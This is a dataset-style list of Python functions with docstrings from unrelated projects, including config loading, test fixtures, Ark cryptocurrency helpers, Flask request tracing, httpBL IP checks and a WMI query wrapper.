            "def load_values(self):\n        \"\"\"\n        Go through the env var map, transferring the values to this object\n        as attributes.\n\n        :raises: RuntimeError if a required env var isn't defined.\n        \"\"\"\n\n        for config_name, evar in self.evar_defs.items():\n            if evar.is_required and evar.name not in os.environ:\n                raise RuntimeError((\n                    \"Missing required environment variable: {evar_name}\\n\"\n                    \"{help_txt}\"\n                ).format(evar_name=evar.name, help_txt=evar.help_txt))\n            # Env var is present. Transfer its value over.\n            if evar.name in os.environ:\n                self[config_name] = os.environ.get(evar.name)\n            else:\n                self[config_name] = evar.default_val\n            # Perform any validations or transformations.\n            for filter in evar.filters:\n                current_val = self.get(config_name)\n                new_val = filter(current_val, evar)\n                self[config_name] = new_val\n        # This is the top-level filter that is often useful for checking\n        # the values of related env vars (instead of individual validation).\n        self._filter_all()"
        ],
        [
            "def embed_data(request):\n    \"\"\"\n    Create a temporary directory with input data for the test.\n    The directory contents is copied from a directory with the same name as the module located in the same directory of\n    the test module.\n    \"\"\"\n    result = _EmbedDataFixture(request)\n    result.delete_data_dir()\n    result.create_data_dir()\n    yield result\n    result.delete_data_dir()"
        ],
        [
            "def assert_equal_files(self, obtained_fn, expected_fn, fix_callback=lambda x:x, binary=False, encoding=None):\n        '''\n        Compare two files contents. If the files differ, show the diff and write a nice HTML\n        diff file into the data directory.\n\n        Searches for the filenames both inside and outside the data directory (in that order).\n\n        :param unicode obtained_fn: basename to obtained file into the data directory, or full path.\n\n        :param unicode expected_fn: basename to expected file into the data directory, or full path.\n\n        :param bool binary:\n            Thread both files as binary files.\n\n        :param unicode encoding:\n            File's encoding. If not None, contents obtained from file will be decoded using this\n            `encoding`.\n\n        :param callable fix_callback:\n            A callback to \"fix\" the contents of the obtained (first) file.\n            This callback receives a list of strings (lines) and must also return a list of lines,\n            changed as needed.\n            The resulting lines will be used to compare with the contents of expected_fn.\n\n        :param bool binary:\n            .. seealso:: zerotk.easyfs.GetFileContents\n        '''\n        import os\n        from zerotk.easyfs import GetFileContents, GetFileLines\n\n        __tracebackhide__ = True\n        import io\n\n        def FindFile(filename):\n            # See if this path exists in the data dir\n            data_filename = self.get_filename(filename)\n            if os.path.isfile(data_filename):\n                return data_filename\n\n            # If not, we might have already received a full path\n            if os.path.isfile(filename):\n                return filename\n\n            # If we didn't find anything, raise an error\n            from ._exceptions import MultipleFilesNotFound\n            raise MultipleFilesNotFound([filename, data_filename])\n\n        obtained_fn = FindFile(obtained_fn)\n        expected_fn = FindFile(expected_fn)\n\n        if binary:\n            obtained_lines = GetFileContents(obtained_fn, binary=True)\n            expected_lines = GetFileContents(expected_fn, binary=True)\n            assert obtained_lines == expected_lines\n        else:\n            obtained_lines = fix_callback(GetFileLines(obtained_fn, encoding=encoding))\n            expected_lines = GetFileLines(expected_fn, encoding=encoding)\n\n            if obtained_lines != expected_lines:\n                html_fn = os.path.splitext(obtained_fn)[0] + '.diff.html'\n                html_diff = self._generate_html_diff(\n                    expected_fn, expected_lines, obtained_fn, obtained_lines)\n                with io.open(html_fn, 'w') as f:\n                    f.write(html_diff)\n\n                import difflib\n                diff = ['FILES DIFFER:', obtained_fn, expected_fn]\n                diff += ['HTML DIFF: %s' % html_fn]\n                diff += difflib.context_diff(obtained_lines, expected_lines)\n                raise AssertionError('\\n'.join(diff) + '\\n')"
        ],
        [
            "def _generate_html_diff(self, expected_fn, expected_lines, obtained_fn, obtained_lines):\n        \"\"\"\n        Returns a nice side-by-side diff of the given files, as a string.\n\n        \"\"\"\n        import difflib\n        differ = difflib.HtmlDiff()\n        return differ.make_file(\n            fromlines=expected_lines,\n            fromdesc=expected_fn,\n            tolines=obtained_lines,\n            todesc=obtained_fn,\n        )"
        ],
        [
            "def add_peer(self, peer):\n        \"\"\"\n        Add a peer or multiple peers to the PEERS variable, takes a single string or a list.\n\n        :param peer(list or string)\n        \"\"\"\n        if type(peer) == list:\n            for i in peer:\n                check_url(i)\n            self.PEERS.extend(peer)\n        elif type(peer) == str:\n            check_url(peer)\n            self.PEERS.append(peer)"
        ],
        [
            "def remove_peer(self, peer):\n        \"\"\"\n        remove one or multiple peers from PEERS variable\n\n        :param peer(list or string):\n        \"\"\"\n        if type(peer) == list:\n            for x in peer:\n                check_url(x)\n                for i in self.PEERS:\n                    if x in i:\n                        self.PEERS.remove(i)\n        elif type(peer) == str:\n            check_url(peer)\n            for i in self.PEERS:\n                if peer == i:\n                    self.PEERS.remove(i)\n        else:\n            raise ValueError('peer paramater did not pass url validation')"
        ],
        [
            "def status(self):\n        \"\"\"\n        check the status of the network and the peers\n\n        :return: network_height, peer_status\n        \"\"\"\n        peer = random.choice(self.PEERS)\n        formatted_peer = 'http://{}:4001'.format(peer)\n        peerdata = requests.get(url=formatted_peer + '/api/peers/').json()['peers']\n        peers_status = {}\n\n        networkheight = max([x['height'] for x in peerdata])\n\n        for i in peerdata:\n            if 'http://{}:4001'.format(i['ip']) in self.PEERS:\n                peers_status.update({i['ip']: {\n                    'height': i['height'],\n                    'status': i['status'],\n                    'version': i['version'],\n                    'delay': i['delay'],\n                }})\n\n        return {\n            'network_height': networkheight,\n            'peer_status': peers_status\n        }"
        ],
        [
            "def broadcast_tx(self, address, amount, secret, secondsecret=None, vendorfield=''):\n        \"\"\"broadcasts a transaction to the peerslist using ark-js library\"\"\"\n\n        peer = random.choice(self.PEERS)\n        park = Park(\n            peer,\n            4001,\n            constants.ARK_NETHASH,\n            '1.1.1'\n        )\n\n        return park.transactions().create(address, str(amount), vendorfield, secret, secondsecret)"
        ],
        [
            "def register(self, service, name=''):\n        \"\"\"\n        Exposes a given service to this API.\n        \"\"\"\n        try:\n            is_model = issubclass(service, orb.Model)\n        except StandardError:\n            is_model = False\n\n        # expose an ORB table dynamically as a service\n        if is_model:\n            self.services[service.schema().dbname()] = (ModelService, service)\n\n        else:\n            super(OrbApiFactory, self).register(service, name=name)"
        ],
        [
            "def main():\n    \"\"\" Main entry point, expects doctopt arg dict as argd. \"\"\"\n    global DEBUG\n    argd = docopt(USAGESTR, version=VERSIONSTR, script=SCRIPT)\n    DEBUG = argd['--debug']\n\n    width = parse_int(argd['--width'] or DEFAULT_WIDTH) or 1\n    indent = parse_int(argd['--indent'] or (argd['--INDENT'] or 0))\n    prepend = ' ' * (indent * 4)\n    if prepend and argd['--indent']:\n        # Smart indent, change max width based on indention.\n        width -= len(prepend)\n\n    userprepend = argd['--prepend'] or (argd['--PREPEND'] or '')\n    prepend = ''.join((prepend, userprepend))\n    if argd['--prepend']:\n        # Smart indent, change max width based on prepended text.\n        width -= len(userprepend)\n    userappend = argd['--append'] or (argd['--APPEND'] or '')\n    if argd['--append']:\n        width -= len(userappend)\n\n    if argd['WORDS']:\n        # Try each argument as a file name.\n        argd['WORDS'] = (\n            (try_read_file(w) if len(w) < 256 else w)\n            for w in argd['WORDS']\n        )\n        words = ' '.join((w for w in argd['WORDS'] if w))\n    else:\n        # No text/filenames provided, use stdin for input.\n        words = read_stdin()\n\n    block = FormatBlock(words).iter_format_block(\n        chars=argd['--chars'],\n        fill=argd['--fill'],\n        prepend=prepend,\n        strip_first=argd['--stripfirst'],\n        append=userappend,\n        strip_last=argd['--striplast'],\n        width=width,\n        newlines=argd['--newlines'],\n        lstrip=argd['--lstrip'],\n    )\n\n    for i, line in enumerate(block):\n        if argd['--enumerate']:\n            # Current line number format supports up to 999 lines before\n            # messing up. Who would format 1000 lines like this anyway?\n            print('{: >3}: {}'.format(i + 1, line))\n        else:\n            print(line)\n\n    return 0"
        ],
        [
            "def debug(*args, **kwargs):\n    \"\"\" Print a message only if DEBUG is truthy. \"\"\"\n    if not (DEBUG and args):\n        return None\n\n    # Include parent class name when given.\n    parent = kwargs.get('parent', None)\n    with suppress(KeyError):\n        kwargs.pop('parent')\n\n    # Go back more than once when given.\n    backlevel = kwargs.get('back', 1)\n    with suppress(KeyError):\n        kwargs.pop('back')\n\n    frame = inspect.currentframe()\n    # Go back a number of frames (usually 1).\n    while backlevel > 0:\n        frame = frame.f_back\n        backlevel -= 1\n    fname = os.path.split(frame.f_code.co_filename)[-1]\n    lineno = frame.f_lineno\n    if parent:\n        func = '{}.{}'.format(parent.__class__.__name__, frame.f_code.co_name)\n    else:\n        func = frame.f_code.co_name\n\n    lineinfo = '{}:{} {}: '.format(\n        C(fname, 'yellow'),\n        C(str(lineno).ljust(4), 'blue'),\n        C().join(C(func, 'magenta'), '()').ljust(20)\n    )\n    # Patch args to stay compatible with print().\n    pargs = list(C(a, 'green').str() for a in args)\n    pargs[0] = ''.join((lineinfo, pargs[0]))\n    print_err(*pargs, **kwargs)"
        ],
        [
            "def parse_int(s):\n    \"\"\" Parse a string as an integer.\n        Exit with a message on failure.\n    \"\"\"\n    try:\n        val = int(s)\n    except ValueError:\n        print_err('\\nInvalid integer: {}'.format(s))\n        sys.exit(1)\n    return val"
        ],
        [
            "def try_read_file(s):\n    \"\"\" If `s` is a file name, read the file and return it's content.\n        Otherwise, return the original string.\n        Returns None if the file was opened, but errored during reading.\n    \"\"\"\n    try:\n        with open(s, 'r') as f:\n            data = f.read()\n    except FileNotFoundError:\n        # Not a file name.\n        return s\n    except EnvironmentError as ex:\n        print_err('\\nFailed to read file: {}\\n  {}'.format(s, ex))\n        return None\n    return data"
        ],
        [
            "def wait(self, timeout=None):\n        \"\"\"\n        Wait for response until timeout.\n        If timeout is specified to None, ``self.timeout`` is used.\n\n        :param float timeout: seconds to wait I/O\n        \"\"\"\n        if timeout is None:\n            timeout = self._timeout\n        while self._process.check_readable(timeout):\n            self._flush()"
        ],
        [
            "def make_seekable(fileobj):\n    \"\"\"\n    If the file-object is not seekable, return  ArchiveTemp of the fileobject,\n    otherwise return the file-object itself\n    \"\"\"\n    if sys.version_info < (3, 0) and isinstance(fileobj, file):\n        filename = fileobj.name\n        fileobj = io.FileIO(fileobj.fileno(), closefd=False)\n        fileobj.name = filename\n    assert isinstance(fileobj, io.IOBase), \\\n        \"fileobj must be an instance of io.IOBase or a file, got %s\" \\\n        % type(fileobj)\n    return fileobj if fileobj.seekable() \\\n        else ArchiveTemp(fileobj)"
        ],
        [
            "def init_app(self, app):\n        \"\"\"Setup before_request, after_request handlers for tracing.\n        \"\"\"\n        app.config.setdefault(\"TRACY_REQUIRE_CLIENT\", False)\n        if not hasattr(app, 'extensions'):\n            app.extensions = {}\n\n        app.extensions['restpoints'] = self\n        app.before_request(self._before)\n        app.after_request(self._after)"
        ],
        [
            "def _before(self):\n        \"\"\"Records the starting time of this reqeust.\n        \"\"\"\n        # Don't trace excluded routes.\n        if request.path in self.excluded_routes:\n            request._tracy_exclude = True\n            return\n\n        request._tracy_start_time = monotonic()\n        client = request.headers.get(trace_header_client, None)\n        require_client = current_app.config.get(\"TRACY_REQUIRE_CLIENT\", False)\n        if client is None and require_client:\n            abort(400, \"Missing %s header\" % trace_header_client)\n\n        request._tracy_client = client\n        request._tracy_id = request.headers.get(trace_header_id, new_id())"
        ],
        [
            "def _after(self, response):\n        \"\"\"Calculates the request duration, and adds a transaction\n        ID to the header.\n        \"\"\"\n        # Ignore excluded routes.\n        if getattr(request, '_tracy_exclude', False):\n            return response\n\n        duration = None\n        if getattr(request, '_tracy_start_time', None):\n            duration = monotonic() - request._tracy_start_time\n\n        # Add Trace_ID header.\n        trace_id = None\n        if getattr(request, '_tracy_id', None):\n            trace_id = request._tracy_id\n            response.headers[trace_header_id] = trace_id\n\n        # Get the invoking client.\n        trace_client = None\n        if getattr(request, '_tracy_client', None):\n            trace_client = request._tracy_client\n\n        # Extra log kwargs.\n        d = {'status_code': response.status_code,\n             'url': request.base_url,\n             'client_ip': request.remote_addr,\n             'trace_name': trace_client,\n             'trace_id': trace_id,\n             'trace_duration': duration}\n        logger.info(None, extra=d)\n        return response"
        ],
        [
            "def expand_words(self, line, width=60):\n        \"\"\" Insert spaces between words until it is wide enough for `width`.\n        \"\"\"\n        if not line.strip():\n            return line\n        # Word index, which word to insert on (cycles between 1->len(words))\n        wordi = 1\n        while len(strip_codes(line)) < width:\n            wordendi = self.find_word_end(line, wordi)\n            if wordendi < 0:\n                # Reached the end?, try starting at the front again.\n                wordi = 1\n                wordendi = self.find_word_end(line, wordi)\n            if wordendi < 0:\n                # There are no spaces to expand, just prepend one.\n                line = ''.join((' ', line))\n            else:\n                line = ' '.join((line[:wordendi], line[wordendi:]))\n                wordi += 1\n\n        # Don't push a single word all the way to the right.\n        if ' ' not in strip_codes(line).strip():\n            return line.replace(' ', '')\n        return line"
        ],
        [
            "def iter_add_text(self, lines, prepend=None, append=None):\n        \"\"\" Prepend or append text to lines. Yields each line. \"\"\"\n        if (prepend is None) and (append is None):\n            yield from lines\n        else:\n            # Build up a format string, with optional {prepend}/{append}\n            fmtpcs = ['{prepend}'] if prepend else []\n            fmtpcs.append('{line}')\n            if append:\n                fmtpcs.append('{append}')\n            fmtstr = ''.join(fmtpcs)\n            yield from (\n                fmtstr.format(prepend=prepend, line=line, append=append)\n                for line in lines\n            )"
        ],
        [
            "def iter_char_block(self, text=None, width=60, fmtfunc=str):\n        \"\"\" Format block by splitting on individual characters. \"\"\"\n        if width < 1:\n            width = 1\n        text = (self.text if text is None else text) or ''\n        text = ' '.join(text.split('\\n'))\n        escapecodes = get_codes(text)\n        if not escapecodes:\n            # No escape codes, use simple method.\n            yield from (\n                fmtfunc(text[i:i + width])\n                for i in range(0, len(text), width)\n            )\n        else:\n            # Ignore escape codes when counting.\n            blockwidth = 0\n            block = []\n            for i, s in enumerate(get_indices_list(text)):\n                block.append(s)\n                if len(s) == 1:\n                    # Normal char.\n                    blockwidth += 1\n                if blockwidth == width:\n                    yield ''.join(block)\n                    block = []\n                    blockwidth = 0\n            if block:\n                yield ''.join(block)"
        ],
        [
            "def iter_space_block(self, text=None, width=60, fmtfunc=str):\n        \"\"\" Format block by wrapping on spaces. \"\"\"\n        if width < 1:\n            width = 1\n        curline = ''\n        text = (self.text if text is None else text) or ''\n        for word in text.split():\n            possibleline = ' '.join((curline, word)) if curline else word\n            # Ignore escape codes.\n            codelen = sum(len(s) for s in get_codes(possibleline))\n            reallen = len(possibleline) - codelen\n            if reallen > width:\n                # This word would exceed the limit, start a new line with\n                # it.\n                yield fmtfunc(curline)\n                curline = word\n            else:\n                curline = possibleline\n        # yield the last line.\n        if curline:\n            yield fmtfunc(curline)"
        ],
        [
            "def squeeze_words(line, width=60):\n        \"\"\" Remove spaces in between words until it is small enough for\n            `width`.\n            This will always leave at least one space between words,\n            so it may not be able to get below `width` characters.\n        \"\"\"\n        # Start removing spaces to \"squeeze\" the text, leaving at least one.\n        while ('  ' in line) and (len(line) > width):\n            # Remove two spaces from the end, replace with one.\n            head, _, tail = line.rpartition('  ')\n            line = ' '.join((head, tail))\n        return line"
        ],
        [
            "def check_ip(self, ip):\n        \"\"\"\n        Check IP trough the httpBL API\n\n        :param ip: ipv4 ip address\n        :return: httpBL results or None if any error is occurred\n        \"\"\"\n\n        self._last_result = None\n\n        if is_valid_ipv4(ip):\n            key = None\n            if self._use_cache:\n                key = self._make_cache_key(ip)\n                self._last_result = self._cache.get(key, version=self._cache_version)\n\n            if self._last_result is None:\n                # request httpBL API\n                error, age, threat, type = self._request_httpbl(ip)\n                if error == 127 or error == 0:\n                    self._last_result = {\n                        'error': error,\n                        'age': age,\n                        'threat': threat,\n                        'type': type\n                    }\n                    if self._use_cache:\n                        self._cache.set(key, self._last_result, timeout=self._api_timeout, version=self._cache_version)\n            if self._last_result is not None and settings.CACHED_HTTPBL_USE_LOGGING:\n                logger.info(\n                    'httpBL check ip: {0}; '\n                    'httpBL result: error: {1}, age: {2}, threat: {3}, type: {4}'.format(ip,\n                                                                                         self._last_result['error'],\n                                                                                         self._last_result['age'],\n                                                                                         self._last_result['threat'],\n                                                                                         self._last_result['type']\n                                                                                         )\n                )\n\n        return self._last_result"
        ],
        [
            "def is_threat(self, result=None, harmless_age=None, threat_score=None, threat_type=None):\n        \"\"\"\n        Check if IP is a threat\n\n        :param result: httpBL results; if None, then results from last check_ip() used (optional)\n        :param harmless_age: harmless age for check if httpBL age is older (optional)\n        :param threat_score: threat score for check if httpBL threat is lower (optional)\n        :param threat_type:  threat type, if not equal httpBL score type, then return False (optional)\n        :return: True or False\n        \"\"\"\n\n        harmless_age = harmless_age if harmless_age is not None else settings.CACHED_HTTPBL_HARMLESS_AGE\n        threat_score = threat_score if threat_score is not None else settings.CACHED_HTTPBL_THREAT_SCORE\n        threat_type = threat_type if threat_type is not None else -1\n        result = result if result is not None else self._last_result\n        threat = False\n        if result is not None:\n            if result['age'] < harmless_age and result['threat'] > threat_score:\n                threat = True\n            if threat_type > -1:\n                if result['type'] & threat_type:\n                    threat = True\n                else:\n                    threat = False\n        return threat"
        ],
        [
            "def is_suspicious(self, result=None):\n        \"\"\"\n        Check if IP is suspicious\n\n        :param result: httpBL results; if None, then results from last check_ip() used (optional)\n        :return: True or False\n        \"\"\"\n\n        result = result if result is not None else self._last_result\n        suspicious = False\n        if result is not None:\n            suspicious = True if result['type'] > 0 else False\n        return suspicious"
        ],
        [
            "def invalidate_ip(self, ip):\n        \"\"\"\n        Invalidate httpBL cache for IP address\n\n        :param ip: ipv4 IP address\n        \"\"\"\n\n        if self._use_cache:\n            key = self._make_cache_key(ip)\n            self._cache.delete(key, version=self._cache_version)"
        ],
        [
            "def invalidate_cache(self):\n        \"\"\"\n        Invalidate httpBL cache\n        \"\"\"\n\n        if self._use_cache:\n            self._cache_version += 1\n            self._cache.increment('cached_httpbl_{0}_version'.format(self._api_key))"
        ],
        [
            "def run(self):\n        \"\"\"Runs the consumer.\"\"\"\n        self.log.debug('consumer is running...')\n\n        self.running = True\n        while self.running:\n            self.upload()\n\n        self.log.debug('consumer exited.')"
        ],
        [
            "def upload(self):\n        \"\"\"Upload the next batch of items, return whether successful.\"\"\"\n        success = False\n        batch = self.next()\n        if len(batch) == 0:\n            return False\n\n        try:\n            self.request(batch)\n            success = True\n        except Exception as e:\n            self.log.error('error uploading: %s', e)\n            success = False\n            if self.on_error:\n                self.on_error(e, batch)\n        finally:\n            # cleanup\n            for item in batch:\n                self.queue.task_done()\n\n            return success"
        ],
        [
            "def next(self):\n        \"\"\"Return the next batch of items to upload.\"\"\"\n        queue = self.queue\n        items = []\n        item = self.next_item()\n        if item is None:\n            return items\n\n        items.append(item)\n        while len(items) < self.upload_size and not queue.empty():\n            item = self.next_item()\n            if item:\n                items.append(item)\n\n        return items"
        ],
        [
            "def next_item(self):\n        \"\"\"Get a single item from the queue.\"\"\"\n        queue = self.queue\n        try:\n            item = queue.get(block=True, timeout=5)\n            return item\n        except Exception:\n            return None"
        ],
        [
            "def request(self, batch, attempt=0):\n        \"\"\"Attempt to upload the batch and retry before raising an error \"\"\"\n        try:\n            q = self.api.new_queue()\n            for msg in batch:\n                q.add(msg['event'], msg['value'], source=msg['source'])\n            q.submit()\n        except:\n            if attempt > self.retries:\n                raise\n            self.request(batch, attempt+1)"
        ],
        [
            "def _camelcase_to_underscore(url):\n    \"\"\"\n    Translate camelCase into underscore format.\n\n    >>> _camelcase_to_underscore('minutesBetweenSummaries')\n    'minutes_between_summaries'\n\n    \"\"\"\n    def upper2underscore(text):\n        for char in text:\n            if char.islower():\n                yield char\n            else:\n                yield '_'\n                if char.isalpha():\n                    yield char.lower()\n    return ''.join(upper2underscore(url))"
        ],
        [
            "def create_tree(endpoints):\n    \"\"\"\n    Creates the Trello endpoint tree.\n\n    >>> r = {'1': { \\\n                 'actions': {'METHODS': {'GET'}}, \\\n                 'boards': { \\\n                     'members': {'METHODS': {'DELETE'}}}} \\\n            }\n    >>> r == create_tree([ \\\n                 'GET /1/actions/[idAction]', \\\n                 'DELETE /1/boards/[board_id]/members/[idMember]'])\n    True\n\n    \"\"\"\n    tree = {}\n\n    for method, url, doc in endpoints:\n        path = [p for p in url.strip('/').split('/')]\n        here = tree\n\n        # First element (API Version).\n        version = path[0]\n        here.setdefault(version, {})\n        here = here[version]\n\n        # The rest of elements of the URL.\n        for p in path[1:]:\n            part = _camelcase_to_underscore(p)\n            here.setdefault(part, {})\n            here = here[part]\n\n        # Allowed HTTP methods.\n        if not 'METHODS' in here:\n            here['METHODS'] = [[method, doc]]\n        else:\n            if not method in here['METHODS']:\n                here['METHODS'].append([method, doc])\n\n    return tree"
        ],
        [
            "def main():\n    \"\"\"\n    Prints the complete YAML.\n\n    \"\"\"\n    ep = requests.get(TRELLO_API_DOC).content\n    root = html.fromstring(ep)\n\n    links = root.xpath('//a[contains(@class, \"reference internal\")]/@href')\n    pages = [requests.get(TRELLO_API_DOC + u)\n             for u in links if u.endswith('index.html')]\n\n    endpoints = []\n    for page in pages:\n        root = html.fromstring(page.content)\n        sections = root.xpath('//div[@class=\"section\"]/h2/..')\n        for sec in sections:\n            ep_html = etree.tostring(sec).decode('utf-8')\n            ep_text = html2text(ep_html).splitlines()\n            match = EP_DESC_REGEX.match(ep_text[0])\n            if not match:\n                continue\n            ep_method, ep_url = match.groups()\n            ep_text[0] = ' '.join([ep_method, ep_url])\n            ep_doc = b64encode(gzip.compress('\\n'.join(ep_text).encode('utf-8')))\n            endpoints.append((ep_method, ep_url, ep_doc))\n\n    print(yaml.dump(create_tree(endpoints)))"
        ],
        [
            "def query(self, wql):\n        \"\"\"Connect by wmi and run wql.\"\"\"\n        try:\n            self.__wql = ['wmic', '-U',\n                          self.args.domain + '\\\\' + self.args.user + '%' + self.args.password,\n                          '//' + self.args.host,\n                          '--namespace', self.args.namespace,\n                          '--delimiter', self.args.delimiter,\n                          wql]\n            self.logger.debug(\"wql: {}\".format(self.__wql))\n            self.__output = subprocess.check_output(self.__wql)\n            self.logger.debug(\"output: {}\".format(self.__output))\n            self.logger.debug(\"wmi connect succeed.\")\n            self.__wmi_output = self.__output.splitlines()[1:]\n            self.logger.debug(\"wmi_output: {}\".format(self.__wmi_output))\n            self.__csv_header = csv.DictReader(self.__wmi_output, delimiter='|')\n            self.logger.debug(\"csv_header: {}\".format(self.__csv_header))\n            return list(self.__csv_header)\n        except subprocess.CalledProcessError as e:\n            self.unknown(\"Connect by wmi and run wql error: %s\" % e)"
        ],
        [
            "def log(self, url=None, credentials=None, do_verify_certificate=True):\n        \"\"\"\n        Wrapper for the other log methods, decide which one based on the\n        URL parameter.\n        \"\"\"\n        if url is None:\n            url = self.url\n        if re.match(\"file://\", url):\n            self.log_file(url)\n        elif re.match(\"https://\", url) or re.match(\"http://\", url):\n            self.log_post(url, credentials, do_verify_certificate)\n        else:\n            self.log_stdout()"
        ],
        [
            "def log_file(self, url=None):\n        \"\"\"\n        Write to a local log file\n        \"\"\"\n        if url is None:\n            url = self.url\n        f = re.sub(\"file://\", \"\", url)\n        try:\n            with open(f, \"a\") as of:\n                of.write(str(self.store.get_json_tuples(True)))\n        except IOError as e:\n            print(e)\n            print(\"Could not write the content to the file..\")"
        ],
        [
            "def log_post(self, url=None, credentials=None, do_verify_certificate=True):\n        \"\"\"\n        Write to a remote host via HTTP POST\n        \"\"\"\n        if url is None:\n            url = self.url\n        if credentials is None:\n            credentials = self.credentials\n        if do_verify_certificate is None:\n            do_verify_certificate = self.do_verify_certificate\n        if credentials and \"base64\" in credentials:\n            headers = {\"Content-Type\": \"application/json\", \\\n                        'Authorization': 'Basic %s' % credentials[\"base64\"]}\n        else:\n            headers = {\"Content-Type\": \"application/json\"}\n        try:\n            request = requests.post(url, headers=headers, \\\n                    data=self.store.get_json(), verify=do_verify_certificate)\n        except httplib.IncompleteRead as e:\n            request = e.partial"
        ],
        [
            "def register_credentials(self, credentials=None, user=None, user_file=None, password=None, password_file=None):\n        \"\"\"\n        Helper method to store username and password\n        \"\"\"\n        # lets store all kind of credential data into this dict\n        if credentials is not None:\n            self.credentials = credentials\n        else:\n            self.credentials = {}\n            # set the user from CLI or file\n            if user:\n                self.credentials[\"user\"] = user\n            elif user_file:\n                with open(user_file, \"r\") as of:\n                    # what would the file entry look like?\n                    pattern = re.compile(\"^user: \")\n                    for l in of:\n                        if re.match(pattern, l):\n                            # strip away the newline\n                            l = l[0:-1]\n                            self.credentials[\"user\"] = re.sub(pattern, \"\", l)\n                # remove any surrounding quotes\n                if self.credentials[\"user\"][0:1] == '\"' and \\\n                                    self.credentials[\"user\"][-1:] == '\"':\n                    self.credentials[\"user\"] = self.credentials[\"user\"][1:-1]\n            # set the password from CLI or file\n            if password:\n                self.credentials[\"password\"] = password\n            elif password_file:\n                with open(password_file, \"r\") as of:\n                    # what would the file entry look like?\n                    pattern = re.compile(\"^password: \")\n                    for l in of:\n                        if re.match(pattern, l):\n                            # strip away the newline\n                            l = l[0:-1]\n                            self.credentials[\"password\"] = \\\n                                                    re.sub(pattern, \"\", l)\n                # remove any surrounding quotes\n                if self.credentials[\"password\"][0:1] == '\"' and \\\n                                    self.credentials[\"password\"][-1:] == '\"':\n                    self.credentials[\"password\"] = \\\n                                        self.credentials[\"password\"][1:-1]\n\n            # if both user and password is set,\n            #  1. encode to base 64 for basic auth\n            if \"user\" in self.credentials and \"password\" in self.credentials:\n                c = self.credentials[\"user\"] + \":\" + self.credentials[\"password\"]\n                self.credentials[\"base64\"] = b64encode(c.encode()).decode(\"ascii\")"
        ],
        [
            "def set_connection(host=None, database=None, user=None, password=None):\n    \"\"\"Set connection parameters. Call set_connection with no arguments to clear.\"\"\"\n    c.CONNECTION['HOST'] = host\n    c.CONNECTION['DATABASE'] = database\n    c.CONNECTION['USER'] = user\n    c.CONNECTION['PASSWORD'] = password"
        ],
        [
            "def set_delegate(address=None, pubkey=None, secret=None):\n    \"\"\"Set delegate parameters. Call set_delegate with no arguments to clear.\"\"\"\n    c.DELEGATE['ADDRESS'] = address\n    c.DELEGATE['PUBKEY'] = pubkey\n    c.DELEGATE['PASSPHRASE'] = secret"
        ],
        [
            "def balance(address):\n        \"\"\"\n        Takes a single address and returns the current balance.\n        \"\"\"\n        txhistory = Address.transactions(address)\n        balance = 0\n        for i in txhistory:\n            if i.recipientId == address:\n                balance += i.amount\n            if i.senderId == address:\n                balance -= (i.amount + i.fee)\n\n        delegates = Delegate.delegates()\n        for i in delegates:\n            if address == i.address:\n                forged_blocks = Delegate.blocks(i.pubkey)\n                for block in forged_blocks:\n                    balance += (block.reward + block.totalFee)\n\n        if balance < 0:\n            height = Node.height()\n            logger.fatal('Negative balance for address {0}, Nodeheight: {1)'.format(address, height))\n            raise NegativeBalanceError('Negative balance for address {0}, Nodeheight: {1)'.format(address, height))\n        return balance"
        ],
        [
            "def balance_over_time(address):\n        \"\"\"returns a list of named tuples,  x.timestamp, x.amount including block rewards\"\"\"\n        forged_blocks = None\n        txhistory = Address.transactions(address)\n        delegates = Delegate.delegates()\n        for i in delegates:\n            if address == i.address:\n                forged_blocks = Delegate.blocks(i.pubkey)\n\n        balance_over_time = []\n        balance = 0\n        block = 0\n\n        Balance = namedtuple(\n            'balance',\n            'timestamp amount')\n\n        for tx in txhistory:\n            if forged_blocks:\n                while forged_blocks[block].timestamp <= tx.timestamp:\n                    balance += (forged_blocks[block].reward + forged_blocks[block].totalFee)\n                    balance_over_time.append(Balance(timestamp=forged_blocks[block].timestamp, amount=balance))\n                    block += 1\n\n            if tx.senderId == address:\n                balance -= (tx.amount + tx.fee)\n                res = Balance(timestamp=tx.timestamp, amount=balance)\n                balance_over_time.append(res)\n            if tx.recipientId == address:\n                balance += tx.amount\n                res = Balance(timestamp=tx.timestamp, amount=balance)\n                balance_over_time.append(res)\n\n        if forged_blocks and block <= len(forged_blocks) - 1:\n            if forged_blocks[block].timestamp > txhistory[-1].timestamp:\n                for i in forged_blocks[block:]:\n                    balance += (i.reward + i.totalFee)\n                    res = Balance(timestamp=i.timestamp, amount=balance)\n                    balance_over_time.append(res)\n\n        return balance_over_time"
        ],
        [
            "def value_to_bool(config_val, evar):\n    \"\"\"\n    Massages the 'true' and 'false' strings to bool equivalents.\n\n    :param str config_val: The env var value.\n    :param EnvironmentVariable evar: The EVar object we are validating\n        a value for.\n    :rtype: bool\n    :return: True or False, depending on the value.\n    \"\"\"\n    if not config_val:\n        return False\n    if config_val.strip().lower() == 'true':\n        return True\n    else:\n        return False"
        ],
        [
            "def validate_is_not_none(config_val, evar):\n    \"\"\"\n    If the value is ``None``, fail validation.\n\n    :param str config_val: The env var value.\n    :param EnvironmentVariable evar: The EVar object we are validating\n        a value for.\n    :raises: ValueError if the config value is None.\n    \"\"\"\n    if config_val is None:\n        raise ValueError(\n            \"Value for environment variable '{evar_name}' can't \"\n            \"be empty.\".format(evar_name=evar.name))\n    return config_val"
        ],
        [
            "def validate_is_boolean_true(config_val, evar):\n    \"\"\"\n    Make sure the value evaluates to boolean True.\n\n    :param str config_val: The env var value.\n    :param EnvironmentVariable evar: The EVar object we are validating\n        a value for.\n    :raises: ValueError if the config value evaluates to boolean False.\n    \"\"\"\n    if config_val is None:\n        raise ValueError(\n            \"Value for environment variable '{evar_name}' can't \"\n            \"be empty.\".format(evar_name=evar.name))\n    return config_val"
        ],
        [
            "def value_to_python_log_level(config_val, evar):\n    \"\"\"\n    Convert an evar value into a Python logging level constant.\n\n    :param str config_val: The env var value.\n    :param EnvironmentVariable evar: The EVar object we are validating\n        a value for.\n    :return: A validated string.\n    :raises: ValueError if the log level is invalid.\n    \"\"\"\n    if not config_val:\n        config_val = evar.default_val\n    config_val = config_val.upper()\n    # noinspection PyProtectedMember\n    return logging._checkLevel(config_val)"
        ],
        [
